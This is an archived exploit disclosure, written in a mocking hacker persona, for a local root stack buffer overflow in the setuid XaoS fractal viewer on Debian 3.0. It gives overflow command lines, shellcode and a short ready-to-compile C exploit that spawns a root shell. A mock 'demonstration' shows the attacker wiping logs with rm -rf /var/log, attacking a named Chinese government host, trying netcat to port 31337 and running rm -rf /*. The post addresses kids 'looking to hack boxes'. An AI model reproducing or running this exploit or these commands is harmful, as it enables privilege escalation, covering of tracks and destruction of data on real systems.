source: http://www.securityfocus.com/bid/7838/info

It has been reported that Xaos is vulnerable to a boundary condition error in the command option processing. Because of this, an attacker may be able to gain elevated privileges, potentially compromising the integrity of the host.

/* xaos <= 3.0-23 ? 0day local root xploit on debian 3.0 whoody          
    */
/*      by: bazarr                                                         
  */
/*      bazarr@ziplip.com                                                  
  */
/* 	bazarr episode #4						     * 
 										

*hendy* i dont build nests for da winter, cause i dont have no time for bui
lding nests

dis is da advisory and xploit at da same time for a local root hole in debi
an 3.0. 
if dave censor dis he out of his mind! dis my second local root xploit in a
 week!
when bugtraq be heading down south to county jail quick wid all da cross si
te scripting bugs
and advisorys for hoolio's ftpd servers (WHO DA HELL IS HOOLIO). lets be re
al about dis
advisorys for non popular software are a dime a dozen. i da first young boy
 to come around 
wid real advisorys in many a months. so please gimmie small break. 

i release more advisorys den combined times dvdfairy has DoS'd phrack.ru

dats alot!

--- You have been kicked from #openbsd by Dianora
(I have been coding before you were even a glint in your fathers eye. go aw
ay)

dianora when i finish "da design and implementation of da 4.4bsd operating 
system" (A BOOK)
i be back to challenge you on bsd kernel , den you have no choice but to le
t me stay and give me +v in #openbsd.
thank you. (she kicked young 16 year old boy out of channel for xposing rem
ote hole in default install!) 

ok lets take a look at the vendor info for xaos:

DESCRIPTION
       XaoS  is a protable real-time interactive fractal zoomer/morpher.  U
NIX version works under X11, SVGA and text terminals.  If you don't knwo wh
at fractal is or you want
       to know more about XaoS features you should see animated tutorial.  
 Run XaoS and press 'H' twice.  It is much more fun than reading of boring 
manual  page  :)  and  it
       supports foregin languages. You might also read  xaos.info file for 
some advanced stuff (like how to write animations and tutorials manually, p
ort or extend XaoS, algo?
       rithms used etc.)

first thing dat i spot is spelling mistake please patch 'knwo' into 'no' as
ap.

so we know dat xaos is a program which you zoom around in when you get real
 stoned(seriously). 
lets get to da local root hole in xaos. 

lets take a look at my terminal session wid xaos: 

c00l@debian:~/code/dump% ls -al xaos
ls: xaos: No such file or directory
c00l@debian:~/code/dump% #well it aint here so lemme get back to da irc 
c00l@debian:~/code/dump% #wait a second! i got an idea
c00l@debian:~/code/dump% ls -al /usr/bin/xaos 
-rwsr-xr-x    1 root     root       379324 Apr  3  2001 /usr/bin/xaos
c00l@debian:~/code/dump% #suid root?! dat mean if it xploited it will resul
t in uid = 0 
c00l@debian:~/code/dump% #what will i do now?

now what i be doin is dis , bare wid me here fellow security researches (lc
amtuf you able to keep up wid dis?) 
lets keep going into dis adventure, lets check if you be vulnerable

c00l@debian:~/code/dump% #ok now we be checking if dis xaos is vulnerable t
o 0day bug which i have discovered 
c00l@debian:~/code/dump% /usr/bin/xaos -language `perl -e 'print "A"x2049'`
^C
c00l@debian:~/code/dump% #ok im not vulnerable i guess
c00l@debian:~/code/dump% #w8 i have an idea!
c00l@debian:~/code/dump% /usr/bin/xaos -language `perl -e 'print "A"x20049'
`
Segmentation fault
c00l@debian:~/code/dump% #aww crap i be vulnerable , what now?


after auditing for many a days and many a nights to find dis bug i am still
 weary from all of it. 
so lemme try and keep on going through dis adventure wid xaos, lets try and
 xploit it dis time. 

c00l@debian:~/code/dump% ./set #dis put shellcode in enviroment with many a
 0x90 around it 
[c00l:dump]$ /usr/bin/xaos -language `perl -e 'print "\x45\xfe\xff\xbf"x809
6'` -display A
Segmentation fault
[c00l:dump]$ #its not xploitable i guess 
[c00l:dump]$ #w8 i got an idea
[c00l:dump]$ /usr/bin/xaos -language `perl -e 'print "\x45\xfe\xff\xbf"x809
6'` -display AA
Segmentation fault
[c00l:dump]$ /usr/bin/xaos -language `perl -e 'print "\x45\xfe\xff\xbf"x809
6'` -display AAA
Segmentation fault
[c00l:dump]$ /usr/bin/xaos -language `perl -e 'print "\x45\xfe\xff\xbf"x809
6'` -display AAAA
sh-2.05a# id ; uname -a
uid=1001(c00l) gid=1001(c00l) euid=0(root) groups=1001(c00l)
Linux debian 2.4.18 #2 SMP Tue Nov 5 21:10:53 EST 2002 i686 unknown
sh-2.05a# # I DID IT 
sh-2.05a# exit    
exit
[c00l:dump]$ #be ethical and just run uname ; id and exit , thanks!

woa dis be going too fast for some security researchers let me slow down an
d xplain dis. 

xaos be doing somthing like dis wid its -language argument 

++++++++
char hoolio[4096]; //big as to not allow stack overflow

strcpy(hoolio,argv[i]) //secure
++++++++

but it is NOT secure , a attacker is able to overflow 'hoolio' wid his own 
data!
den he overwrite da saved return address on da stack with his own and den h
e execute a shell. 

-------------
ENDING 

xaos is vulnerable to a stack buffer overflow which be yeilding root privle
ges on debian 3.0 (w00dy) 

-------------	
PATCH

see many a people dont understand dis issue, i am young highschool boy 
doing many a bleeding edge freelance security work for free , it not my job
 to provide patch 
and pamper you. but if you really dont want to get hacked with many a 0day 
xploits just dont go online
and dont make fun of caddis cuz he be xploiting your ftpd in record time to
 rm you(seriously man). 

-------------	
VENDORS NOTIFYED

none

-------------	
VENDORS VULNERABLE

debain 3.0 & unstable on default install!!!
FreeBSD x.x ports! 
OpenBSD x.x ports!
NetBSD x.x ports!!! 
anyone who installed xaos!

-------------
XPLOIT 

as i promised , dis is da xploit!. if my code looks hoodly poodly its cuz
 
i have trouble programming after last nights crystal meth ride. 

demonstation:

[pan@****.kr]$ cc bazarr-episode-4.c
[pan@****.kr]$ ./a.out aaaa
[*] bazarr :)
sh-2.05a# id
uid=1003(pan) gid=1003(pan) euid=0(root) groups=1003(pan)
sh-2.05a# rm -rf /var/log 
sh-2.05a# cc b.c 
sh-2.05a# ./a.out -t 39 -h ****.xxtax.gov.cn -s 90 -b 
.... ..... .... .... .... ....
done. 
sh-2.05a# nc ****.xxtax.gov.cn 31337
sh: nc: command not found
sh-2.05a# rm -rf /* & exit

just compile and run!!! so user friendly its not even funny!
the 'a's are stack padding for da xaos , try 1-4 'a's
woa hey i just made a fool of myself! i dident need any stack padding there
.

dis C-code is very complex , do not attempt to modify it. 

it is very user friendly though for da following groups:

1. 22 year old php programming cs students
2. younger kids looking to hack boxes! (I LOVE DIS GROUP)
3. professional security researches to make money off highschool boy by usi
ng dis xploit on der clients and charging dem for it
4. elite lurking blackhat laughing at my codez! (I CANT SAY I LIKE DIS GROU
P ALL DAT MUCH) 

AND NOW THE WORLDS FIRST 4 LINE ROOT XPLOIT PROGRAMMED IN C BY BAZARR

*/

char c[] = "\x31\xc0\x31\xdb\xb0\x17\xcd\x80\x31\xc0\xb0\x0b\x99\x52\x68\
x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80";
int main(int cc,char **a) {char x[256];char b[72000];memset(b,0x99,sizeof(b
));;;memcpy(b+71968,c,strlen(c));/**/;;b[sizeof(b)]=0;;setenv("C",b,1);
if (!a[1]){printf("[*] bazarr :(\n");exit(1);};/**/;;sprintf(x,"/usr/bin/xa
os -language `perl -e 'print 
\"\x45\xfe\xfe\xbf\"x8096'` -display %s",a[1]);;;printf("[*] bazarr :)\n");
system(x);}

/* 


-------------
ADVANCE WARNING 

double free() bug in popular suid root application installed by default on 
debian 3.0 comming soon!
remote xploit for debian application comming soon!

and so many more i cannot even list dem all(SERIOUSLY). 

16 year old boy release more bugs in few weeks den your whole crew does in 
da last 5 years!
i think most of you be a little bitter about dat and dats why you some of y
ou be anti bazarr. 
your company should stick to hoolio's ftpd server. 

-------------
GREETS

sir hackalot - you cool man! you like the 2pac of hacking. what ever happen
d to you and PHAZE? it been awhile!

-------------
BYE

bye bye guys i gotta go feed the dog and work on math homework.

bye.

-bazarr


*/













